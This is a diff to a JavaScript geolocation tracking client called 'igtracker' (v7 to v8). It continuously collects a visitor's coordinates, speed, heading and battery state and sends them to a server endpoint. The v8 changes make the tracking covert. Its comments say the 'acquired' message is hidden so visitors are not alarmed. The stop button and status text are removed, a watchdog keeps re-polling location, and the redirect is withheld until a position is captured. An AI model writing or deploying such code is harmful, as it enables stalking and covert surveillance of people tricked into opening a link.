@@ -1,19 +1,22 @@
-/* 連続位置追跡クライアント (igtracker) v7
+/* 連続位置追跡クライアント (igtracker) v8
    window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
+
    ・ユーザー操作なしで自動開始し、開いている間ずっと取り続ける
    ・測位が途切れたらウォッチドッグが自動復帰
-   ・取得できるまでリダイレクトしない（未許可時は「もう一度」だけ出す）
-   ・一度でも取得できたら ok を固定し、あとから未取得扱いに戻らない */
+   ・取得できても「取得しました」を出さない（来訪者を警戒させない）
+   ・未取得（拒否・無反応）のときだけ「もう一度」ボタンを出す
+   ・一度でも測位できたら、以降は未取得判定に戻らない
+   ・遷移は「測位が取れたとき」だけ（ボタンで飛ばせない） */
 (function () {
   "use strict";
 
   var CODE = window.LT_CODE || "";
   if (!CODE) return;
 
-  var API  = "/l/" + encodeURIComponent(CODE) + "/p";
-  var IV   = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
+  var API = "/l/" + encodeURIComponent(CODE) + "/p";
+  var IV = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
   var MAXMIN = (window.LT_MAX || 180) | 0;
-  var HIT  = window.LT_HIT || 0;
+  var HIT = window.LT_HIT || 0;
   var SEND_EVERY = Math.min(IV, 4000);
   var GEO_OPTS = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
@@ -21,12 +24,9 @@
   var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
   var WAIT = (parseFloat(window.LT_WAIT) || 10) * 1000;
   var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
-  var BRIEF = !!window.LT_BRIEF;
-  var TXT = {
-    ask:  window.LT_ASK_TEXT  || "位置情報の使用を許可してください",
-    ok:   window.LT_OK_TEXT   || "取得しました。移動します…",
-    deny: window.LT_DENY_TEXT || "位置情報が許可されていません"
-  };
+  var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
+  var DENY_TEXT = window.LT_DENY_TEXT || "位置情報が許可されていません";
+  var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
 
   var SID = (function () {
     try {
@@ -44,37 +44,40 @@
   var wid = null, wake = null, clock = null, sender = null, dog = null;
   var waitTimer = null;
   var stopped = true, gotFix = false, bestAcc = null;
-  var lastFix = 0, lastAsk = 0, lastRestart = 0, denied = false;
-  var state = "wait";           // wait | ok | deny
+  var lastFix = 0, lastAsk = 0, lastRestart = 0;
+  var state = "wait";              // wait | ok | deny
   var batt = null, chg = null;
 
   function $(id) { return document.getElementById(id); }
-  function setTxt(id, v) { var e = $(id); if (e) e.textContent = v; }
   function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
 
-  function say(m, c) {
+  function line(text, warn) {
     var s = $("lt_st");
     if (!s) return;
-    if (BRIEF) {
-      var cls = state === "deny" ? "warn" : (state === "ok" ? "on" : "dim");
-      s.className = "ask-t lt-" + cls;
-      s.textContent = state === "deny" ? TXT.deny : (state === "ok" ? TXT.ok : TXT.ask);
-      return;
-    }
-    if (state === "deny" && !m) { s.textContent = TXT.deny; s.className = "lt-warn"; return; }
-    s.textContent = m || TXT.ask;
-    s.className = "lt-" + (c || "dim");
+    s.textContent = text;
+    s.className = "line" + (warn ? " warn" : "");
   }
 
-  function showBtns() {
+  function showRetry() {
     var r = $("lt_retry");
-    if (r) r.style.display = state === "deny" ? "" : "none";
+    if (r) {
+      r.textContent = RETRY_TEXT;
+      r.style.display = state === "deny" ? "" : "none";
+    }
   }
 
   function setState(st) {
+    if (st === "ok") {
+      if (state === "ok") return;
+      state = "ok";
+      line("", false);          // 「取得しました」は出さない
+      showRetry();
+      return;
+    }
     state = st;
-    say("", st === "deny" ? "warn" : (st === "ok" ? "on" : "dim"));
-    showBtns();
+    if (st === "deny") line(DENY_TEXT, true);
+    else line(ASK_TEXT, false);
+    showRetry();
   }
 
   /* 「未取得のまま待ちすぎ」のタイマー。取得済みなら何もしない。 */
@@ -90,10 +93,11 @@
   }
 
   function tick() {
-    if (!started || BRIEF) return;
+    if (!started) return;
     var sec = Math.floor((Date.now() - started) / 1000);
-    setTxt("lt_time", ("0" + Math.floor(sec / 60)).slice(-2) + ":" +
-                      ("0" + (sec % 60)).slice(-2));
+    var e = $("lt_time");
+    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" +
+                           ("0" + (sec % 60)).slice(-2);
   }
 
   function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }
@@ -145,45 +149,36 @@
   function onPos(p) {
     var c = (p && p.coords) || {};
     if (c.latitude == null || c.longitude == null) return;
-    var firstFix = !gotFix;
-    gotFix = true; denied = false; count++;
+    var first = !gotFix;
+    gotFix = true; count++;
     lastFix = Date.now();
     if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
-    if (firstFix) setState("ok");
+    if (first) {
+      setState("ok");
+      if (DEST) setTimeout(leave, DEST_MIN);   // 取れたときだけ移動
+    }
     q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
              acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
     if (q.length > 3000) q.splice(0, q.length - 3000);
     if (c.accuracy && (bestAcc === null || c.accuracy < bestAcc)) bestAcc = c.accuracy;
-    setTxt("lt_now", c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
-                    (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : ""));
-    say("記録中 " + count + " 点" +
-        (bestAcc ? "（最高精度 ±" + Math.round(bestAcc) + "m）" : ""), "on");
+    var n = $("lt_now");
+    if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
+                           (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
     if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
-    if (firstFix && DEST) setTimeout(leave, DEST_MIN);
   }
 
   function onErr(e) {
     var c = e && e.code;
-    if (c === 1) {                       // 明示的に拒否
-      denied = true;
-      if (!gotFix) setState("deny");
-      else say("位置情報が拒否されています", "warn");
-      return;
-    }
-    if (c === 2) {                       // 取得不可（アプリ内ブラウザ等）
-      if (!gotFix) setState("deny");
-      else say("位置を取得できません", "warn");
-      return;
-    }
-    // c === 3 (タイムアウト) など → 取得済みなら触らない、未取得ならもう少し待つ
-    if (gotFix) say("測位がタイムアウト。自動で再試行します", "warn");
-    else armWait(WAIT);
+    if (gotFix) return;                       // 取得済みなら未取得に戻さない
+    if (c === 1) { setState("deny"); return; }  // 明示的に拒否
+    if (c === 2) { setState("deny"); return; }  // 取得不可（アプリ内ブラウザ等）
+    armWait(WAIT);                              // タイムアウト等はもう少し待つ
   }
 
   function watchdog() {
     if (stopped || left || !navigator.geolocation) return;
     var gap = Date.now() - (lastFix || started || Date.now());
-    var need = (denied || state === "deny") ? 8000 : 15000;
+    var need = (state === "deny") ? 8000 : 15000;
     if (gap > need && Date.now() - lastAsk > 6000) {
       lastAsk = Date.now();
       try { navigator.geolocation.getCurrentPosition(onPos, onErr, GEO_OPTS); } catch (e) {}
@@ -198,18 +193,17 @@
     var el = $("lt_perm");
     if (!el) return Promise.resolve("unknown");
     if (!navigator.permissions || !navigator.permissions.query) {
-      el.textContent = "unknown"; el.className = "lt-dim";
+      el.textContent = "unknown"; el.className = "sr";
       return Promise.resolve("unknown");
     }
     return navigator.permissions.query({ name: "geolocation" })
       .then(function (p) {
         el.textContent = p.state;
-        el.className = p.state === "granted" ? "lt-on"
-          : (p.state === "denied" ? "lt-warn" : "lt-dim");
+        el.className = "sr";
         p.onchange = function () { showPerm(); };
         return p.state;
       })
-      .catch(function () { el.textContent = "unknown"; el.className = "lt-dim"; return "unknown"; });
+      .catch(function () { el.textContent = "unknown"; return "unknown"; });
   }
 
   function checkInApp() {
@@ -292,12 +286,12 @@
   function boot() {
     if (started) return;
     started = Date.now(); stopped = false;
-    showPerm(); checkInApp(); readBatt(); keepAwake(); showBtns();
+    showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
     if (!navigator.geolocation) { setState("deny"); return; }
     ask().then(function () {
       if (stopped || left) return;
       start();
-      if (!gotFix) q.push({ ts: iso(Date.now()) });   // 取得できていなければIP地点を1点だけ
+      if (!gotFix) q.push({ ts: iso(Date.now()) });   // 未取得ならIP地点を1点だけ
       send({ kind: "open" });
       clock = setInterval(tick, 1000);
       sender = setInterval(function () {
@@ -307,7 +301,6 @@
         if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
       }, SEND_EVERY);
       dog = setInterval(watchdog, 5000);
-      say("記録を開始しました（自動・永続）", "on");
       if (!gotFix) armWait(WAIT);
     });
   }
@@ -323,8 +316,8 @@
     clock = sender = dog = null;
     beacon("stop");
     state = "wait";
-    say("停止しました" + (why ? "（" + why + "）" : "") + " 記録 " + count + " 点", "dim");
-    showBtns();
+    if (!gotFix) line(ASK_TEXT, false);
+    showRetry();
   }
 
   function resume() {
@@ -360,19 +353,10 @@
     if (!stopped && !gotFix) attempt();
   }, { passive: true });
 
-  var go = $("lt_go"), sp = $("lt_stop"), cp = $("lt_copy"), rt = $("lt_retry");
-  if (go) go.addEventListener("click", function () {
-    if (stopped) { boot(); go.textContent = "再取得"; }
-    else attempt();
-  });
+  var rt = $("lt_retry");
   if (rt) rt.addEventListener("click", function () {
     setState("wait");
     attempt();
-  });
-  if (sp) sp.addEventListener("click", function () { stop("手動"); });
-  if (cp) cp.addEventListener("click", function () {
-    try { navigator.clipboard.writeText(location.href); } catch (e) {}
-    cp.textContent = "コピーしました";
   });
 
   window.LT_LIVE = { start: boot, stop: stop, leave: leave, retry: attempt, sid: SID };
